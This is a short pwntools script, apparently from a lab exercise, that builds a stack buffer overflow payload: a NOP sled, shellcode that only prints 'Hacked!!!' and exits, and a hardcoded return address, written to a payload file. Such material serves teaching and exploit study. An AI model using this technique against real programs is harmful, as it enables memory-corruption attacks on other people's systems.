from pwn import *
context.arch = 'amd64'
context.os = 'linux'

# shellcode
s_code = shellcraft.amd64.linux.echo('Hacked!!!') + shellcraft.amd64.linux.exit()
s_code_asm = asm(s_code)

# return address
# r_addr - nop_len - addr_len
r_addr = 0x00007fffffffda88 - len(s_code_asm) - 64 - 8
addr = p64(r_addr, endian='little')

nop = asm('nop', arch='amd64')

payload =  b"2\n" + nop*(1573 - len(s_code_asm) - 64) + s_code_asm + nop*64 + addr

with open("./shellcode_payload_inj_echo" , "wb") as f:
	f.write(payload)


